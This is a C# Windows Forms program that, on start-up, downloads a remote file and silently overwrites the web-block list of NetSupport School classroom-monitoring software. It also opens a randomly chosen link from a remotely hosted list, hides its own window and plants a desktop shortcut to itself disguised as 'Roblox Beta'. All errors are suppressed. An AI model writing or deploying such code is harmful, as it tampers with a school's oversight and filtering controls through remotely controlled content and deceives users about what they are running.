﻿using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using IWshRuntimeLibrary;

namespace Roll
{
    public partial class Form1 : Form
    {
        private string weblockUrl = "https://github.com/punyjin/lastest_version_info/blob/main/weblock.htm";
        private string linkDataUrl = "https://github.com/punyjin/lastest_version_info/raw/main/ricado_link_data.txt";

        public Form1()
        {
            InitializeComponent();
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            await DownloadAndInstallWebBlock();
            await RandomCallAndOpenLink();
            this.Hide();
            CreateShortcutOnDesktop();
        }

        private async Task DownloadAndInstallWebBlock()
        {
            string targetPath = @"C:\Program Files (x86)\NetSupport\NetSupport School\weblock.htm";

            try
            {
                string weblockContent = await GetPageContentAsync(weblockUrl);

                if (!string.IsNullOrEmpty(weblockContent))
                {
                    string directory = Path.GetDirectoryName(targetPath);
                    if (!Directory.Exists(directory))
                    {
                        Directory.CreateDirectory(directory);
                    }

                    System.IO.File.WriteAllText(targetPath, weblockContent);
                }
                else
                {
                    return;
                }
            }
            catch (Exception ex)
            {
                return;
            }
        }

        private async Task RandomCallAndOpenLink()
        {
            string fileContent = await GetPageContentAsync(linkDataUrl);
            if (fileContent != null)
            {
                var links = fileContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                if (links.Length > 0)
                {
                    Random random = new Random();
                    string randomLink = links[random.Next(links.Length)];
                    Process.Start(randomLink);
                }
                else
                {
                    return;
                }
            }
            else
            {
                return;
            }
        }

        private async Task<string> GetPageContentAsync(string url)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    
                    return await client.GetStringAsync(url);
                }
            }
            catch (Exception ex)
            {
               
                return null;
            }
        }
        
        private void CreateShortcutOnDesktop()
        {
            try
            {
                string shortcutTargetPath = Application.ExecutablePath; 
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // ตำแหน่ง Desktop ของผู้ใช้
                string shortcutPath = Path.Combine(desktopPath, "Roblox.lnk");

                var shell = new WshShell();
                var shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
                shortcut.TargetPath = shortcutTargetPath; 
                shortcut.WorkingDirectory = Path.GetDirectoryName(shortcutTargetPath);
                shortcut.Description = "Roblox Beta"; 
                shortcut.Save(); 

              
            }
            catch (Exception ex)
            {
               return ;
            }
        }
    }
}
